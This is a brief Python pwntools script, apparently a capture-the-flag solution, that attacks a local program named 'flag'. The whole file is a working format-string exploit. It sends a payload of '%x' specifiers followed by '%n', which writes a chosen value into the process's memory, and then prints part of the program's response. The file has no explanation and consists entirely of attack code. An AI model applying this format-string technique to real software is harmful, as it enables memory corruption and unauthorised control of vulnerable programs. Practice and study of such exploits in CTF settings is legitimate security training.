#!/usr/bin/python
from pwn import *
p = process('flag')

fs = "%8x.%8x.%8x.%1972x.%n"

p.sendline(fs)
print p.read().split('.')[-1]
